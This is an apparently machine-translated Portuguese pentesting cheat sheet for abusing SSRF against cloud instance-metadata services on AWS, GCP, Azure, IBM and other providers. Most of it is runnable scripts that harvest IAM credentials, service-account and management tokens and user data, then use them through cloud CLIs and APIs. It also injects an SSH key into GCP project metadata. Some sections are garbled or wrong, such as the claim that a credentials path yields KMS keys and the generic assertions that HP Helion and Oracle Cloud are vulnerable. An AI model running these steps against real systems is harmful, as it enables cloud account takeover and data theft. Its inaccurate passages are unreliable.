## AWS

### Abusando do SSRF no ambiente AWS EC2

O endpoint **metadata** pode ser acessado de dentro de qualquer m√°quina EC2 e oferece informa√ß√µes interessantes sobre ela. √â acess√≠vel na URL: `http://169.254.169.254` ([informa√ß√µes sobre o metadata aqui](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)).

Existem **2 vers√µes** do endpoint metadata. A **primeira** permite **acessar** o endpoint via requisi√ß√µes **GET** (ent√£o qualquer **SSRF pode explor√°-lo**). Para a **vers√£o 2**, [IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), voc√™ precisa solicitar um **token** enviando uma requisi√ß√£o **PUT** com um **HTTP header** e, em seguida, usar esse token para acessar o metadata com outro HTTP header (ent√£o √© **mais complicado de explorar** com um SSRF).

Na **vers√£o 2**, o **TTL por padr√£o √© 1**. Isso garante que dispositivos de rede mal configurados (firewalls, dispositivos NAT, roteadores, etc.) n√£o encaminhem o pacote. Isso tamb√©m significa que **cont√™ineres Docker** usando a configura√ß√£o de rede padr√£o (modo bridge) **n√£o poder√£o acessar** o servi√ßo de metadados da inst√¢ncia.\
**IMDSv2** tamb√©m **bloquear√° solicita√ß√µes para buscar um token que inclua o cabe√ßalho `X-Forwarded-For`**. Isso √© para impedir que proxies reversos mal configurados possam acess√°-lo.

Voc√™ pode encontrar informa√ß√µes sobre os [endpoints de metadados na documenta√ß√£o](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html). No seguinte script, algumas informa√ß√µes interessantes s√£o obtidas a partir dele:
```bash
EC2_TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
HEADER="X-aws-ec2-metadata-token: $EC2_TOKEN"
URL="http://169.254.169.254/latest/meta-data"

aws_req=""
if [ "$(command -v curl)" ]; then
    aws_req="curl -s -f -H '$HEADER'"
elif [ "$(command -v wget)" ]; then
    aws_req="wget -q -O - -H '$HEADER'"
else 
    echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
fi

printf "ami-id: "; eval $aws_req "$URL/ami-id"; echo ""
printf "instance-action: "; eval $aws_req "$URL/instance-action"; echo ""
printf "instance-id: "; eval $aws_req "$URL/instance-id"; echo ""
printf "instance-life-cycle: "; eval $aws_req "$URL/instance-life-cycle"; echo ""
printf "instance-type: "; eval $aws_req "$URL/instance-type"; echo ""
printf "region: "; eval $aws_req "$URL/placement/region"; echo ""

echo ""
echo "Account Info"
eval $aws_req "$URL/identity-credentials/ec2/info"; echo ""
eval $aws_req "http://169.254.169.254/latest/dynamic/instance-identity/document"; echo ""

echo ""
echo "Network Info"
for mac in $(eval $aws_req "$URL/network/interfaces/macs/" 2>/dev/null); do 
  echo "Mac: $mac"
  printf "Owner ID: "; eval $aws_req "$URL/network/interfaces/macs/$mac/owner-id"; echo ""
  printf "Public Hostname: "; eval $aws_req "$URL/network/interfaces/macs/$mac/public-hostname"; echo ""
  printf "Security Groups: "; eval $aws_req "$URL/network/interfaces/macs/$mac/security-groups"; echo ""
  echo "Private IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv4-associations/"; echo ""
  printf "Subnet IPv4: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv4-cidr-block"; echo ""
  echo "PrivateIPv6s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv6s"; echo ""
  printf "Subnet IPv6: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv6-cidr-blocks"; echo ""
  echo "Public IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/public-ipv4s"; echo ""
  echo ""
done

echo ""
echo "IAM Role"
eval $aws_req "$URL/iam/info"
for role in $(eval $aws_req "$URL/iam/security-credentials/" 2>/dev/null); do 
  echo "Role: $role"
  eval $aws_req "$URL/iam/security-credentials/$role"; echo ""
  echo ""
done

echo ""
echo "User Data"
# Search hardcoded credentials
eval $aws_req "http://169.254.169.254/latest/user-data"

echo ""
echo "EC2 Security Credentials"
eval $aws_req "$URL/identity-credentials/ec2/security-credentials/ec2-instance"; echo ""
```
Como exemplo de credenciais IAM dispon√≠veis publicamente, voc√™ pode visitar: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws)

Voc√™ tamb√©m pode verificar as credenciais de seguran√ßa **p√∫blicas do EC2** em: [http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance)

Voc√™ pode ent√£o **usar essas credenciais com o AWS CLI**. Isso permitir√° que voc√™ fa√ßa **qualquer coisa que a fun√ß√£o tenha permiss√£o** para fazer.

Para aproveitar as novas credenciais, voc√™ precisar√° criar um novo perfil AWS como este:
```
[profilename]
aws_access_key_id = ASIA6GG7PSQG4TCGYYOU
aws_secret_access_key = a5kssI2I4H/atUZOwBr5Vpggd9CxiT5pUkyPJsjC
aws_session_token = AgoJb3JpZ2luX2VjEGcaCXVzLXdlc3QtMiJHMEUCIHgCnKJl8fwc+0iaa6n4FsgtWaIikf5mSSoMIWsUGMb1AiEAlOiY0zQ31XapsIjJwgEXhBIW3u/XOfZJTrvdNe4rbFwq2gMIYBAAGgw5NzU0MjYyNjIwMjkiDCvj4qbZSIiiBUtrIiq3A8IfXmTcebRDxJ9BGjNwLbOYDlbQYXBIegzliUez3P/fQxD3qDr+SNFg9w6WkgmDZtjei6YzOc/a9TWgIzCPQAWkn6BlXufS+zm4aVtcgvBKyu4F432AuT4Wuq7zrRc+42m3Z9InIM0BuJtzLkzzbBPfZAz81eSXumPdid6G/4v+o/VxI3OrayZVT2+fB34cKujEOnBwgEd6xUGUcFWb52+jlIbs8RzVIK/xHVoZvYpY6KlmLOakx/mOyz1tb0Z204NZPJ7rj9mHk+cX/G0BnYGIf8ZA2pyBdQyVbb1EzV0U+IPlI+nkIgYCrwTCXUOYbm66lj90frIYG0x2qI7HtaKKbRM5pcGkiYkUAUvA3LpUW6LVn365h0uIbYbVJqSAtjxUN9o0hbQD/W9Y6ZM0WoLSQhYt4jzZiWi00owZJjKHbBaQV6RFwn5mCD+OybS8Y1dn2lqqJgY2U78sONvhfewiohPNouW9IQ7nPln3G/dkucQARa/eM/AC1zxLu5nt7QY8R2x9FzmKYGLh6sBoNO1HXGzSQlDdQE17clcP+hrP/m49MW3nq/A7WHIczuzpn4zv3KICLPIw2uSc7QU6tAEln14bV0oHtHxqC6LBnfhx8yaD9C71j8XbDrfXOEwdOy2hdK0M/AJ3CVe/mtxf96Z6UpqVLPrsLrb1TYTEWCH7yleN0i9koRQDRnjntvRuLmH2ERWLtJFgRU2MWqDNCf2QHWn+j9tYNKQVVwHs3i8paEPyB45MLdFKJg6Ir+Xzl2ojb6qLGirjw8gPufeCM19VbpeLPliYeKsrkrnXWO0o9aImv8cvIzQ8aS1ihqOtkedkAsw=
```
Observe o **aws\_session\_token**, ele √© indispens√°vel para que o perfil funcione.

O **PACU** pode ser usado com as credenciais descobertas para descobrir seus privil√©gios e tentar escalon√°-los.

### SSRF em credenciais do AWS ECS (Servi√ßo de Cont√™iner)

O **ECS** √© um grupo l√≥gico de inst√¢ncias EC2 em que voc√™ pode executar um aplicativo sem precisar dimensionar sua pr√≥pria infraestrutura de gerenciamento de cluster, porque o ECS gerencia isso para voc√™. Se voc√™ conseguir comprometer o servi√ßo em execu√ß√£o no **ECS**, os **pontos de extremidade de metadados mudam**.

Se voc√™ acessar _**http://169.254.170.2/v2/credentials/\<GUID>**_, encontrar√° as credenciais da m√°quina ECS. Mas primeiro voc√™ precisa **encontrar o \<GUID>**. Para encontrar o \<GUID>, voc√™ precisa ler a vari√°vel **environ** **AWS\_CONTAINER\_CREDENTIALS\_RELATIVE\_URI** dentro da m√°quina.\
Voc√™ pode ser capaz de l√™-lo explorando uma **Travessia de Caminho** para `file:///proc/self/environ`\
O endere√ßo http mencionado deve fornecer a **AccessKey, SecretKey e token**.
```bash
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || wget "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" -O -
```
{% hint style="info" %}
Note que em **alguns casos** voc√™ poder√° acessar a **inst√¢ncia de metadados EC2** do cont√™iner (verifique as limita√ß√µes de TTL do IMDSv2 mencionadas anteriormente). Nesses cen√°rios, a partir do cont√™iner, voc√™ pode acessar tanto a fun√ß√£o IAM do cont√™iner quanto a fun√ß√£o IAM do EC2.
{% endhint %}

### SSRF para AWS Lambda <a href="#6f97" id="6f97"></a>

Neste caso, as **credenciais s√£o armazenadas em vari√°veis de ambiente**. Portanto, para acess√°-las, voc√™ precisa acessar algo como **`file:///proc/self/environ`**.

O **nome** das **vari√°veis de ambiente interessantes** s√£o:

* `AWS_SESSION_TOKEN`
* `AWS_SECRET_ACCESS_KEY`
* `AWS_ACCES_KEY_ID`

Al√©m disso, al√©m das credenciais IAM, as fun√ß√µes Lambda tamb√©m possuem **dados de evento que s√£o passados para a fun√ß√£o quando ela √© iniciada**. Esses dados s√£o disponibilizados para a fun√ß√£o por meio da [interface de tempo de execu√ß√£o](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html) e podem conter **informa√ß√µes sens√≠veis** (como dentro das **stageVariables**). Ao contr√°rio das credenciais IAM, esses dados s√£o acess√≠veis por SSRF padr√£o em **`http://localhost:9001/2018-06-01/runtime/invocation/next`**.

{% hint style="warning" %}
Observe que as **credenciais lambda** est√£o dentro das **vari√°veis de ambiente**. Portanto, se o **rastreamento de pilha** do c√≥digo lambda imprimir vari√°veis de ambiente, √© poss√≠vel **exfiltr√°-las provocando um erro** no aplicativo.
{% endhint %}

### URL SSRF para AWS Elastic Beanstalk <a href="#6f97" id="6f97"></a>

Recuperamos o `accountId` e `region` da API.
```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
Em seguida, recuperamos o `AccessKeyId`, `SecretAccessKey` e `Token` da API.
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
![](https://miro.medium.com/max/60/0\*4OG-tRUNhpBK96cL?q=20) ![](https://miro.medium.com/max/1469/0\*4OG-tRUNhpBK96cL)

Em seguida, usamos as credenciais com `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/`.

## GCP <a href="#6440" id="6440"></a>

Voc√™ pode [**encontrar aqui a documenta√ß√£o sobre pontos de extremidade de metadados**](https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata).

### URL SSRF para o Google Cloud <a href="#6440" id="6440"></a>

Requer o cabe√ßalho "Metadata-Flavor: Google" ou "X-Google-Metadata-Request: True" e voc√™ pode acessar o ponto de extremidade de metadados com as seguintes URLs:

* http://169.254.169.254
* http://metadata.google.internal
* http://metadata

Pontos de extremidade interessantes para extrair informa√ß√µes:
```bash
# /project
# Project name and number
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
# Project attributes
curl -H "X-Google-Metadata-Request: True" http://metadata/computeMetadata/v1/project/attributes/?recursive=true

# /oslogin
# users
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
# groups
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
# security-keys
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
# authorize
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize

# /instance
# Description
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
# Hostname
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
# ID
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Image
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
# Machine Type
curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
# Name
curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
# Tags
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# User data
curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
# Network Interfaces
for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do 
    echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
    echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
    echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
    echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
    echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
    echo "  ==============  "
done
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do 
    echo "  Name: $sa"
    echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
    echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
    echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
    echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
    echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
    echo "  ==============  "
done
# K8s Attributtes
## Cluster location
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
## Cluster name
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
## Os-login enabled
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
## Kube-env
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
## Kube-labels
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
## Kubeconfig
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig

# All custom project attributes
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"

# All custom project attributes instance attributes
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
    -H "Metadata-Flavor: Google"
```
Beta atualmente N√ÉO requer um cabe√ßalho (obrigado Mathias Karlsson @avlidienbrunn)
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```
{% hint style="danger" %}
Para **usar o token da conta de servi√ßo exfiltrado**, voc√™ pode simplesmente fazer:
```bash
# Via env vars
export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
gcloud projects list

# Via setup
echo "<token>" > /some/path/to/token
gcloud config set auth/access_token_file /some/path/to/token
gcloud projects list
gcloud config unset auth/access_token_file
```
### Adicionar uma chave SSH <a href="#3e24" id="3e24"></a>

Extrair o token
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```
Verifique o escopo do token
```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  { 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```
Agora envie a chave SSH.

{% code overflow="wrap" %}
```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```
{% endcode %}

## Digital Ocean <a href="#9f1f" id="9f1f"></a>

{% hint style="warning" %}
N√£o h√° coisas como Fun√ß√µes AWS ou conta de servi√ßo GCP, ent√£o n√£o espere encontrar credenciais de bot de metadados
{% endhint %}

Documenta√ß√£o dispon√≠vel em [`https://developers.digitalocean.com/documentation/metadata/`](https://developers.digitalocean.com/documentation/metadata/)
```
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/addressAll in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```
## Azure <a href="#cea8" id="cea8"></a>

### Azure VM

[**Documenta√ß√£o** aqui](https://learn.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service?tabs=linux).

* **Deve** conter o cabe√ßalho `Metadata: true`
* N√£o deve conter o cabe√ßalho `X-Forwarded-For`

{% tabs %}
{% tab title="Bash" %}
{% code overflow="wrap" %}
```bash
HEADER="Metadata:true"
URL="http://169.254.169.254/metadata"
API_VERSION="2021-12-13" #https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions

echo "Instance details"
curl -s -f -H "$HEADER" "$URL/instance?api-version=$API_VERSION"

echo "Load Balancer details"
curl -s -f -H "$HEADER" "$URL/loadbalancer?api-version=$API_VERSION"

echo "Management Token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"

echo "Graph token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/"

echo "Vault token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"

echo "Storage token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://storage.azure.com/"
```
{% endcode %}
{% endtab %}

{% endtabs %}

## SSRF em Clouds

### SSRF em AWS

#### Descobrindo metadados

A maneira mais comum de explorar SSRF em AWS √© acessando os metadados do EC2. Para isso, basta fazer uma requisi√ß√£o para `http://169.254.169.254/latest/meta-data/` e ver quais informa√ß√µes est√£o dispon√≠veis.

#### Acessando credenciais

Se o servidor EC2 tiver permiss√µes para acessar outros servi√ßos AWS, √© poss√≠vel acessar as credenciais do IAM do servidor. Para isso, basta fazer uma requisi√ß√£o para `http://169.254.169.254/latest/meta-data/iam/security-credentials/` e ver qual √© o nome do perfil de seguran√ßa. Em seguida, fa√ßa uma requisi√ß√£o para `http://169.254.169.254/latest/meta-data/iam/security-credentials/<profile_name>` para obter as credenciais.

#### Acessando chaves de criptografia

Se o servidor EC2 tiver permiss√µes para acessar o servi√ßo KMS, √© poss√≠vel acessar as chaves de criptografia. Para isso, basta fazer uma requisi√ß√£o para `http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/` e ver qual √© o nome do perfil de seguran√ßa. Em seguida, fa√ßa uma requisi√ß√£o para `http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/<profile_name>` para obter as chaves de criptografia.

### SSRF em GCP

#### Descobrindo metadados

A maneira mais comum de explorar SSRF em GCP √© acessando os metadados do Compute Engine. Para isso, basta fazer uma requisi√ß√£o para `http://metadata.google.internal/computeMetadata/v1/` e ver quais informa√ß√µes est√£o dispon√≠veis.

#### Acessando credenciais

Se o servidor Compute Engine tiver permiss√µes para acessar outros servi√ßos GCP, √© poss√≠vel acessar as credenciais do IAM do servidor. Para isso, basta fazer uma requisi√ß√£o para `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` e obter o token de acesso. Em seguida, use o token para fazer uma requisi√ß√£o para a API do servi√ßo desejado.

#### Acessando chaves de criptografia

Se o servidor Compute Engine tiver permiss√µes para acessar o servi√ßo Cloud KMS, √© poss√≠vel acessar as chaves de criptografia. Para isso, basta fazer uma requisi√ß√£o para `http://metadata.google.internal/computeMetadata/v1/instance/attributes/` e ver quais atributos est√£o dispon√≠veis. Em seguida, fa√ßa uma requisi√ß√£o para `http://metadata.google.internal/computeMetadata/v1/instance/attributes/<attribute_name>` para obter as chaves de criptografia.
```bash
# Powershell
Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -NoProxy -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64
## User data
$userData = Invoke- RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021- 01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

# Paths
/metadata/instance?api-version=2017-04-02
/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
/metadata/instance/compute/userData?api-version=2021-01-01&format=text
```
### Azure App Service

A partir do **env** voc√™ pode obter os valores de `IDENTITY_HEADER` _e_ `IDENTITY_ENDPOINT`. Isso pode ser usado para obter um token para se comunicar com o servidor de metadados.

Na maioria das vezes, voc√™ deseja um token para um desses recursos:

* [https://storage.azure.com](https://storage.azure.com/)
* [https://vault.azure.net](https://vault.azure.net/)
* [https://graph.microsoft.com](https://graph.microsoft.com/)
* [https://management.azure.com](https://management.azure.com/)
```bash
# Check for those env vars to know if you are in an Azure app
echo $IDENTITY_HEADER
echo $IDENTITY_ENDPOINT

# You should also be able to find the folder:
ls /opt/microsoft
#and the file
ls /opt/microsoft/msodbcsql17

# Get management token
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
# Get graph token
curl "$IDENTITY_ENDPOINT?resource=https://graph.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# API
# Get Subscriptions
URL="https://management.azure.com/subscriptions?api-version=2020-01-01"
curl -H "Authorization: $TOKEN" "$URL"
# Get current permission on resources in the subscription
URL="https://management.azure.com/subscriptions/<subscription-uid>/resources?api-version=2020-10-01'"
curl -H "Authorization: $TOKEN" "$URL"
# Get permissions in a VM
URL="https://management.azure.com/subscriptions/<subscription-uid>/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/<VM-name>/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"
curl -H "Authorization: $TOKEN" "$URL"
```

```powershell
# API request in powershell to management endpoint
$Token = 'eyJ0eX..'
$URI='https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
  'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value

# API request to graph endpoint (get enterprise applications)
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value

# Using AzureAD Powershell module witho both management and graph tokens
$token = 'eyJ0e..'
$graphaccesstoken = 'eyJ0eX..'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId 2e91a4f12984-46ee-2736-e32ff2039abc

# Try to get current perms over resources
Get-AzResource
## The following error means that the user doesn't have permissions over any resource
Get-AzResource : 'this.Client.SubscriptionId' cannot be null.
At line:1 char:1
+ Get-AzResource
+ ~~~~~~~~~~~~~~
 + CategoryInfo : CloseError: (:) [Get-AzResource],ValidationException
 + FullyQualifiedErrorId :
Microsoft.Azure.Commands.ResourceManager.Cmdlets.Implementation.GetAzureResourceCmdlet
```
## IBM Cloud <a href="#2af0" id="2af0"></a>

{% hint style="warning" %}
Observe que na IBM, por padr√£o, os metadados n√£o est√£o habilitados, portanto, √© poss√≠vel que voc√™ n√£o consiga acess√°-los mesmo se estiver dentro de uma VM da IBM Cloud.
{% endhint %}

{% code overflow="wrap" %}
```bash
export instance_identity_token=`curl -s -X PUT "http://169.254.169.254/instance_identity/v1/token?version=2022-03-01"\
  -H "Metadata-Flavor: ibm"\
  -H "Accept: application/json"\
  -d '{
        "expires_in": 3600
      }' | jq -r '(.access_token)'`

# Get instance details
curl -s -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" -X GET "http://169.254.169.254/metadata/v1/instance?version=2022-03-01" | jq

# Get SSH keys info
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/keys?version=2022-03-01" | jq

# Get SSH keys fingerprints & user data
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/instance/initialization?version=2022-03-01" | jq

# Get placement groups
curl -s -X GET -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/metadata/v1/placement_groups?version=2022-03-01" | jq

# Get IAM credentials
curl -s -X POST -H "Accept: application/json" -H "Authorization: Bearer $instance_identity_token" "http://169.254.169.254/instance_identity/v1/iam_token?version=2022-03-01" | jq
```
{% endcode %}

## Packetcloud <a href="#2af0" id="2af0"></a>

Documenta√ß√£o dispon√≠vel em [`https://metadata.packet.net/userdata`](https://metadata.packet.net/userdata)

## OpenStack/RackSpace <a href="#2ffc" id="2ffc"></a>

(cabe√ßalho necess√°rio? desconhecido)
```
http://169.254.169.254/openstack
```
## HP Helion <a href="#a8e0" id="a8e0"></a>

## Descri√ß√£o

HP Helion √© uma plataforma de nuvem que fornece servi√ßos de infraestrutura como servi√ßo (IaaS) e plataforma como servi√ßo (PaaS). Ele permite que os usu√°rios criem, implementem e gerenciem aplicativos em nuvem.

## SSRF

O HP Helion √© vulner√°vel a SSRF. Um invasor pode explorar essa vulnerabilidade para enviar solicita√ß√µes HTTP para recursos internos, como o servi√ßo de metadados do EC2, que podem resultar em vazamento de informa√ß√µes confidenciais ou comprometimento do servidor.
```
http://169.254.169.254/2009-04-04/meta-data/
```
## Oracle Cloud <a href="#a723" id="a723"></a>

O Oracle Cloud √© uma plataforma de computa√ß√£o em nuvem oferecida pela Oracle Corporation. Ele fornece servi√ßos de infraestrutura como servi√ßo (IaaS), plataforma como servi√ßo (PaaS), software como servi√ßo (SaaS) e data as a service (DaaS). O Oracle Cloud permite que os usu√°rios criem, implementem e gerenciem aplicativos em uma infraestrutura de nuvem segura e escal√°vel.

### SSRF no Oracle Cloud

O Oracle Cloud √© vulner√°vel a SSRF em v√°rios servi√ßos, incluindo o Oracle Functions, o Oracle Container Engine for Kubernetes (OKE) e o Oracle Cloud Infrastructure (OCI). Essas vulnerabilidades podem ser exploradas para acessar recursos internos, como metadados de inst√¢ncia, credenciais de servi√ßo e arquivos de configura√ß√£o.

Para explorar essas vulnerabilidades, um invasor pode enviar uma solicita√ß√£o HTTP maliciosa para um servi√ßo vulner√°vel, fazendo com que o servidor execute a solicita√ß√£o em seu nome. Isso pode permitir que o invasor acesse recursos internos que normalmente n√£o seriam acess√≠veis a partir da Internet.

Os invasores tamb√©m podem usar SSRF para atacar outros sistemas na rede interna do Oracle Cloud. Por exemplo, um invasor pode explorar uma vulnerabilidade SSRF no Oracle Functions para acessar um servidor de banco de dados interno e extrair dados confidenciais.

Para mitigar essas vulnerabilidades, os usu√°rios do Oracle Cloud devem implementar controles de seguran√ßa adequados, como filtragem de entrada e sa√≠da, autentica√ß√£o forte e monitoramento de rede. Al√©m disso, os usu√°rios devem manter seus sistemas atualizados com as √∫ltimas corre√ß√µes de seguran√ßa e seguir as pr√°ticas recomendadas de seguran√ßa da Oracle.
```
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```
## Alibaba <a href="#51bd" id="51bd"></a>

